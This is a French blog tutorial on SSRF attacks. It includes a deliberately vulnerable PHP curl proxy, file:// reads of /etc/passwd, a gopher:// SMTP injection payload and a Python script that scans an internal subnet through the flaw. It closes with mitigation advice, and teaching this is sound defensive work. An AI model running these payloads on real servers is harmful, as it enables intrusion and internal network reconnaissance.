@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="Qu&#39;est ce que les Server Side Request Forgery ? Les Server Side Request Forgery, ou en abrégé SSRF, sont des vulnérabilités Web permettant de lire des fichiers sur le serveur local. Il ne faut pas...">
+        <meta name="keywords" content="Failles Web, SSRF, Tutoriel">
+        <link rel="icon" href="https://www.dailysecurity.fr/favicon.png">
+        <title>Les Server Side Request Forgery : Comment contourner un pare-feu - Daily Security</title>
+
+        <!-- Stylesheets -->
+        <link href="https://www.dailysecurity.fr/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <link href="https://www.dailysecurity.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daily Security Full Atom Feed" />
+        <link href="https://www.dailysecurity.fr/category/journal-de-geluchat/feed/index.xhtml" type="application/atom+xml" rel="alternate" title="Daily Security Categories Atom Feed" />
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('https://www.dailysecurity.fr/images/fond.png'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+ 
+                       <a class="pull-left" href="https://www.dailysecurity.fr/" style="outline : none;"><img class="mr20 hidden-xs" src="https://www.dailysecurity.fr/images/logo.png" height="57" width="312" alt="logo"></a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="https://www.dailysecurity.fr/">Accueil</a>
+                                <a href="https://www.dailysecurity.fr/categories.html">Catégories</a>
+                            <a  href="https://www.dailysecurity.fr/presentation">À propos</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">Les Server Side Request Forgery : Comment contourner un pare-feu</h1>
+                      <p class="header-date">Par <a href="https://www.dailysecurity.fr/author/geluchat.html">Geluchat</a>, sam. 16 septembre 2017, dans la catégorie <a href="https://www.dailysecurity.fr/category/journal-de-geluchat.html">Journal de geluchat</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="https://www.dailysecurity.fr/tag/failles-web.html">Failles Web</a>, <a href="https://www.dailysecurity.fr/tag/ssrf.html">SSRF</a>, <a href="https://www.dailysecurity.fr/tag/tutoriel.html">Tutoriel</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <h2>Qu'est ce que les Server Side Request Forgery ?</h2>
+<p>Les <strong>Server Side Request Forgery</strong>, ou en abrégé <strong>SSRF</strong>, sont des vulnérabilités Web permettant de lire des fichiers sur le serveur <strong>local</strong>.</p>
+<p>Il ne faut pas les confondre avec les <strong>CSRF</strong> (Cross Site Request Forgery), qui, elles, ont pour but l'exécution d'une requête à l'insu d'un autre utilisateur.</p>
+<p>Un des gros avantages des <strong>SSRF</strong> est la possibilité de contourner les <strong>pare-feux</strong>. </p>
+<p>En effet, les actions se faisant côté serveur, il est possible d'interroger des services n'étant disponibles que localement tels que : </p>
+<ul>
+<li>Des bases de données NoSQL : Redis, MongoDB.</li>
+<li>Des bases de données relationnelles : Oracle, MSSQL, MySQL, PostgreSQL.</li>
+<li>Des services mail : Postfix, Dovecot.</li>
+<li>Des services Web accessibles localement.</li>
+</ul>
+<p>Ce genre de faille est particulièrement présent sur les proxy Web : Un utilisateur du service proxy peut avoir accès à des données internes au serveur, données auxquelles il n'aurait normalement pas du avoir accès.</p>
+<p>Le schéma suivant montre un exemple d'attaque sur un proxy Web n'ayant pas protégé son adresse locale contre les <strong>SSRF</strong> :</p>
+<p><img alt="Schéma SSRF Proxy" src="https://www.dailysecurity.fr/images/Schema_SSRF_Proxy.png"></p>
+<p>On remarque que l'adresse locale est résolue côté serveur et permet à l'attaquant de récupérer le contenu du dossier <em>secret</em>.</p>
+<p>Voyons maintenant les différents types d'exploitation possibles en rapport avec les <strong>SSRF</strong>.</p>
+<h2>Comment exploiter une SSRF : Les schémas d'attaque</h2>
+<p>Nous avons vus précédemment l'exemple de l'exploitation d'un <strong>proxy Web</strong>, mais il existe une multitude de schémas d'attaque.</p>
+<p>L'exemple du proxy Web utilise le protocole HTTP pour accéder à des données internes.    </p>
+<p>Nous sommes alors en droit de nous poser une question :  <br>
+<em>Comment faire pour communiquer avec les autres services (bases de données, services e-mail, etc...) ?</em></p>
+<p>Prenons l'exemple suivant :</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span> 
+
+<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+<span class="nb">curl_setopt_array</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+    <span class="nx">CURLOPT_URL</span> <span class="o">=&gt;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
+<span class="p">));</span>
+
+<span class="nv">$resp</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+
+<p>Cet exemple prend en entrée une adresse et récupère la page associée, le module curl de PHP est une simple adaptation de la commande système <code>curl http://votreurl.com</code>.</p>
+<p>On peut donc utiliser toutes les fonctionnalités de <strong>curl</strong>, en particulier celles liées à la sémantique de l'adresse envoyée au script :
+<code>[protocole]://[IP|nomDeDomaine]:[port]/[param]</code></p>
+<ul>
+<li>Le plus important, le protocole à utiliser : http, https, ftp, <strong>gopher</strong>, <strong>file</strong>, dict, etc.</li>
+<li>L'adresse.</li>
+<li>Le port distant.</li>
+<li>Un ou plusieurs paramètres d'accès, par exemple un dossier ou un fichier.</li>
+</ul>
+<p>La liste des protocoles implémentés par curl est disponible <a href="https://curl.haxx.se/docs/manpage.html">ici</a>.</p>
+<h3>Les protocoles <em>file://</em> et <em>http://</em></h3>
+<p>Un protocole attire notre attention : le protocole <em>file://</em> , celui-ci permet d'ouvrir un fichier sur le serveur. </p>
+<p>En utilisant le script précédent, on peut essayer de lire le fichier /etc/passwd sur le serveur, ce qui donne en action : 
+<img alt="SSRF File" src="https://www.dailysecurity.fr/images/SSRF_File.png"></p>
+<p>Nous avons maintenant accès à n'importe quel fichier du serveur ! 
+<img src="https://www.dailysecurity.fr/images/yes.gif" alt="Yes" style="width: 20%;"></p>
+<p>Le protocole <em>file://</em> nous a permis d'accéder à des fichiers mais <em>comment faire pour communiquer avec les différents services présents sur la machine ?</em></p>
+<p>L'<a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">excellent article</a> de <a href="https://twitter.com/Agarri_FR">Nicolas Grégoire</a> est un très bon exemple de <strong>SSRF</strong> sur un service : la base de données NoSQL <strong>Redis</strong>. </p>
+<p><strong>Redis</strong>, comme MongoDB, est une base de données NoSQL <strong>sans authentification</strong> par défaut. </p>
+<p>L'article explique comment, à l'aide de requêtes HTTP, <em>extraire</em> des données de la base, <em>modifier</em> cette dernière ou même <em>lire</em> des fichiers sur le système.</p>
+<p>Le principal souci de cette méthode est qu'une requête HTTP est obligée d'avoir un format spécifique afin d'être correcte : </p>
+<div class="highlight"><pre><span></span><code><span class="go">GET /index.html</span>
+<span class="go">Host: www.dailysecurity.fr</span>
+<span class="go">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0</span>
+<span class="go">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="go">Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
+<span class="go">Accept-Encoding: gzip, deflate, br</span>
+</code></pre></div>
+
+<p>Ce format restreint l'exploitation de service, par exemple l'accès à un service qui a besoin d'un préambule bien précis.</p>
+<p>Exemple d'accès à la base de données Redis avec une requête HTTP :</p>
+<div class="highlight"><pre><span></span><code>-ERR wrong number of arguments for &#39;get&#39; command
+-ERR unknown command &#39;Host:&#39;
+-ERR unknown command &#39;Accept:&#39;
+-ERR unknown command &#39;Accept-Encoding:&#39;
+-ERR unknown command &#39;Connection:&#39;
+</code></pre></div>
+
+<h3>Le protocole <em>gopher://</em></h3>
+<p>Afin de palier au problème de format, nous pouvons utiliser le protocole <em>gopher://</em>.</p>
+<p><a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> est un protocole concurrent de HTTP qui n'est plus vraiment utilisé mais toujours supporté par curl.</p>
+<p>Il va nous permettre de communiquer avec les services type <em>telnet</em> comme par exemple le service SMTP (e-mail) : <br>
+<em>ps : 1. Pour les sauts de ligne, on doit les encoder deux fois.</em> <br>
+<em>2. La première lettre de la requête est aléatoire (x dans l'exemple) car non prise en compte par le protocole gopher.</em></p>
+<p>On cherche à envoyer un e-mail en utilisant le serveur SMTP disponible localement.</p>
+<p>Contenu du message :</p>
+<div class="highlight"><pre><span></span><code>HELO localhost
+MAIL FROM:&lt;hacker@site.com&gt;
+RCPT TO:&lt;victim@site.com&gt;
+DATA
+From: [Hacker] &lt;hacker@site.com&gt;
+To: &lt;victime@site.com&gt;
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+Subject: Ah Ah AH
+
+You didn&#39;t say the magic word !
+
+
+.
+QUIT
+</code></pre></div>
+
+<p>Ce qui donne en version Gopher : 
+<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://victim.website/curl.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</a></p>
+<p>Pour tester notre <strong>SSRF</strong>, on met en place un serveur netcat sur le port 25 (associé au protocole SMTP) et on attend la requête :     </p>
+<div class="highlight"><pre><span></span><code><span class="go">nc -lvp 25</span>
+<span class="go">listening on [any] 25 ...</span>
+<span class="go">connect to [127.0.0.1] from localhost [127.0.0.1] 35417</span>
+<span class="go">HELO localhost</span>
+<span class="go">MAIL FROM:&lt;hacker@site.com&gt;</span>
+<span class="go">RCPT TO:&lt;victim@site.com&gt;</span>
+<span class="go">DATA</span>
+<span class="go">From: [Hacker] &lt;hacker@site.com&gt;</span>
+<span class="go">To: &lt;victime@site.com&gt;</span>
+<span class="go">Date: Tue, 15 Sep 2017 17:20:26 -0400</span>
+<span class="go">Subject: AH AH AH</span>
+
+<span class="go">You didn&#39;t say the magic word !</span>
+
+
+<span class="go">.</span>
+<span class="go">QUIT</span>
+</code></pre></div>
+
+<p><img src="https://www.dailysecurity.fr/images/firewall.jpg" alt="Yes" style="width: 50%;"></p>
+<h3>Une autre exemple d'utilisation des <em>SSRF</em> : L'énumération d'adresses IP sur le réseau local</h3>
+<p>Nous avons vu dans les parties précédentes que les  <strong>SSRF</strong> jouaient le rôle de proxy afin d’exécuter des requêtes internes.</p>
+<p>Elles peuvent alors servir d'outil pour l'énumération des machines dans les sous-réseaux accessibles.</p>
+<p>La seule contrainte est que le machine à détecter doit avoir au moins un service ouvert.</p>
+<p>Les services les plus communs sont le plus souvent des services Web ou SSH (ports 80, 443, 8080, 22) voire RDP (port 3389) sur Windows.</p>
+<p>On peut deviner les sous-réseaux accessibles grâce aux fichiers de configuration de Apache ( <code>/etc/apache2/apache2.conf</code>) ou en cherchant dans les plages d'adresses IP des réseaux privés :</p>
+<ul>
+<li>10.0.0.0/8</li>
+<li>172.16.0.0/12</li>
+<li>192.168.0.0/16</li>
+</ul>
+<p>Pour énumérer les machines disponibles ayant un service HTTP sur le port 80 on peut utiliser le script suivant :</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">ipRange</span><span class="p">(</span><span class="n">start_ip</span><span class="p">,</span> <span class="n">end_ip</span><span class="p">):</span>
+   <span class="n">start</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">start_ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)))</span>
+   <span class="n">end</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">end_ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)))</span>
+   <span class="n">temp</span> <span class="o">=</span> <span class="n">start</span>
+   <span class="n">ip_range</span> <span class="o">=</span> <span class="p">[]</span>
+   <span class="n">ip_range</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">start_ip</span><span class="p">)</span>
+   <span class="k">while</span> <span class="n">temp</span> <span class="o">!=</span> <span class="n">end</span><span class="p">:</span>
+      <span class="n">start</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+      <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+         <span class="k">if</span> <span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">256</span><span class="p">:</span>
+            <span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+      <span class="n">ip_range</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">temp</span><span class="p">)))</span>    
+   <span class="k">return</span> <span class="n">ip_range</span>
+
+<span class="n">ip_range</span> <span class="o">=</span> <span class="n">ipRange</span><span class="p">(</span><span class="s2">&quot;192.168.0.0&quot;</span><span class="p">,</span> <span class="s2">&quot;192.168.255.255&quot;</span><span class="p">)</span>
+<span class="n">ip_up</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">ip_range</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://victime.website/curl.php?url=http://&quot;</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="s2">&quot;/:80&quot;</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+            <span class="n">ip_up</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+            <span class="nb">print</span> <span class="s2">&quot;[+] Machine : &quot;</span><span class="o">+</span><span class="n">ip</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">ip_up</span><span class="p">))</span>
+</code></pre></div>
+
+<hr>
+<p>Afin de <strong>sécuriser</strong> une application contre les <strong>SSRF</strong>, il faut vérifier :     </p>
+<ul>
+<li>Le <em>protocole</em> utilisé : autoriser seulement <em>http</em> et <em>https</em>.</li>
+<li>L'adresse <em>IP</em> liée à l'URL demandée ne doit pas faire partie d'un <a href="https://fr.wikipedia.org/wiki/R%C3%A9seau_priv%C3%A9">réseau privé</a>.</li>
+</ul>
+<p>Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon <a href="https://twitter.com/Geluchat">Twitter</a> pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.</p>
+<p>Geluchat.</p>
+
+
+    <div class="comments">
+        <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'dailysecurity-fr';
+                var disqus_identifier = 'server-side-request-forgery';
+                var disqus_url = 'https://www.dailysecurity.fr/server-side-request-forgery';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+        <noscript>Please enable JavaScript to view the comments.</noscript>
+    </div>
+        
+    </div>
+        <!-- /Content -->
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://www.dailysecurity.fr/archives.html">Archives</a></li>
+                            <li><a href="https://www.dailysecurity.fr/categories.html">Catégories</a></li>
+                            <li><a href="https://www.dailysecurity.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">Flux RSS</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://twitter.com/Geluchat" target="_blank">Twitter</a></li>
+                            <li><a href="https://github.com/Geluchat" target="_blank">GitHub</a></li>
+                            <li><a href="https://www.linkedin.com/in/baptiste-devigne/" target="_blank">Linkedin</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Les blogs des amis</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://proofofcalc.com/" target="_blank">Proof of Calc</a></li>
+                            <li><a href="http://beta.hackndo.com" target="_blank">Blog de Pixis</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+        <!-- Google Analytics -->
+        <script>
+          (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+          })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+          ga('create', 'UA-97100797-1', 'auto');
+          ga('send', 'pageview');
+        </script>
+        <!-- /Google Analytics -->
+     </body>
+</html>
